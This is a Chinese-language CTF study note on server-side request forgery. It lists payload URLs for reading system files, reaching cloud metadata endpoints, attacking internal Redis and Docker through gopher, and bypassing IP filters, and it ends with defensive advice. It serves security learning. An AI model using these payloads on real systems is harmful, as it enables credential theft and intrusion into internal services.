# SSRF (服务端请求伪造)

## 概述

服务端请求伪造（Server-Side Request Forgery，SSRF）指攻击者控制服务器发起 HTTP 请求到内部或其他受限制的网络资源。CTF 中 SSRF 题目常考察内网探测、文件读取、攻击内网应用（如 Redis、MySQL）、绕过限制等。

## 常见攻击手法

### 1. 基本利用

- **SSRF 检测**：功能如 URL 抓取、远程图片下载、Webhook 回调、URL 参数访问等
- **回显检测**：在可控制的服务器上监听请求，验证服务器是否发出了请求
- **协议利用**：
  - `file://` 协议读取本地文件：`file:///etc/passwd`
  - `dict://` 协议探测端口：`dict://127.0.0.1:6379/info`
  - `gopher://` 协议构造任意 TCP 数据包：用于攻击 Redis、MySQL 等内网服务
  - `http://` / `https://`：常规 HTTP 访问

### 2. 内网探测

- **端口扫描**：利用响应时间差异或内容差异探测内网主机端口的开放情况
  - `http://127.0.0.1:80`、`http://127.0.0.1:3306`、`http://127.0.0.1:6379`
- **内网 IP 扫描**：
  - `http://10.0.0.1`、`http://172.16.0.1`、`http://192.168.1.1`
- **云服务元数据**：
  - AWS：`http://169.254.169.254/latest/meta-data/`
  - GCP：`http://metadata.google.internal/computeMetadata/v1/`
  - 阿里云：`http://100.100.100.200/latest/meta-data/`
  - Azure：`http://169.254.169.254/metadata/instance?api-version=2017-08-01`

### 3. 文件读取

- **file:// 协议**：`file:///etc/passwd`、`file:///flag`、`file:///proc/self/environ`
- **利用 PHP 伪协议**（后端为 PHP 时）：
  - `php://filter/convert.base64-encode/resource=/var/www/html/flag.php`
- **利用 Python urllib**：
  - `file:///etc/passwd`（Python 的 urllib 支持 file 协议）

### 4. 攻击内网应用

- **Redis 未授权访问**：
  - 使用 `gopher://` 协议构造 Redis 命令
  - 写 SSH 公钥：`gopher://127.0.0.1:6379/_*3$3SET$3key$...`
  - 写 Webshell：通过 Redis 写文件到 Web 目录
  - 写 crontab：反弹 shell
- **MySQL 内网攻击**：
  - 使用 `gopher://` 构造 MySQL 查询
- **Elasticsearch**：`http://127.0.0.1:9200/_cat/indices`
- **MongoDB**：`http://127.0.0.1:27017`
- **Docker API**：`http://127.0.0.1:2375/containers/json`

### 5. DoS 攻击

- **磁盘耗尽**：`http://127.0.0.1:0` 引发死循环或大量日志
- **大文件读取**：`file:///dev/zero`、`file:///dev/urandom`（消耗服务器内存和 CPU）
- **内网应用 DoS**：定位内网中脆弱的服务进行攻击

### 6. URL 解析差异绕过

- **利用 DNS 解析**：
  - DNS 重绑定（DNS Rebinding）：第一次解析为白名单域名，第二次为内网 IP
  - 使用 `0x7f000001`（十六进制 IP）代替 `127.0.0.1`
  - 使用 `2130706433`（十进制 IP）代替 `127.0.0.1`
  - 使用 `0`（短格式 IP）：`http://0/` 等效于 `http://127.0.0.1/`
  - 使用 `127.1` 代替 `127.0.0.1`
- **URL 解析绕过方法**：
  - `http://127.0.0.1`、`http://localhost`、`http://[::1]`（IPv6 localhost）
  - `http://⑯⑨。②⑤④。⑯⑨。②⑤④/`（Unicode 字符域名）
  - 添加 `#` 或 `@`：`http://expected.com@127.0.0.1`
  - 使用重定向：搭建一个从白名单域名到内网地址的重定向服务
  - 短链接绕过：用短网址服务跳转到内网

### 7. 绕过 IP 限制

- **302 跳转**：利用白名单域名的 302 跳转到内网地址
- **DNS Rebinding**：使用诸如 `1e100.net` 或 `rebind.it` 服务
- **利用 URL 特性**：
  - `http://127.0.0.1#@白名单.com`
  - `http://白名单.com@127.0.0.1`
- **存在认证绕过**：某些情况下 `localhost` 可以绕过 IP 限制

### 8. Gopher 协议详解

Gopher 协议是 SSRF 中最强大的工具之一，可以构造任意 TCP 数据包。

- **格式**：`gopher://host:port/_<urlencode后的数据>`
- **Redis 利用**：
  - `gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a...`
- **MySQL 利用**：需要构造 MySQL 的握手包和查询包，较为复杂

## 相关工具

| 工具 | 用途 |
|------|------|
| Gopherus | 自动生成 gopher payload |
| SSRFmap | SSRF 自动化利用框架 |
| See-SURF | SSRF 检测工具 |
| DNS Rebinding Tool | dnsrebinding.net |

## 防御建议

- 对请求 URL 进行严格的白名单校验（允许的协议、主机和端口）
- 禁止访问私有 IP 地址段（127.0.0.0/8、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16）
- 禁用不必要的 URL 协议（file、dict、gopher）
- 使用 DNS 解析白名单而非 IP 白名单

## CTF 中的常见考点

- 利用 file:// 协议读取服务器上的 flag 文件
- 探测内网端口，发现 Redis 或 MySQL 服务
- 使用 gopher:// 攻击内网 Redis 写 Webshell 或 SSH 密钥
- DNS 重绑定绕过 IP 限制访问内网服务

## 相关技能

- [XXE](XXE.md)
- [文件泄露](文件泄露.md)
- [信息搜集](Web信息搜集.md)
- [逻辑漏洞](Web逻辑漏洞.md)
- [信息搜集](../云安全/云信息搜集.md)
- [其他流量分析](../安全杂项/其他流量分析.md)
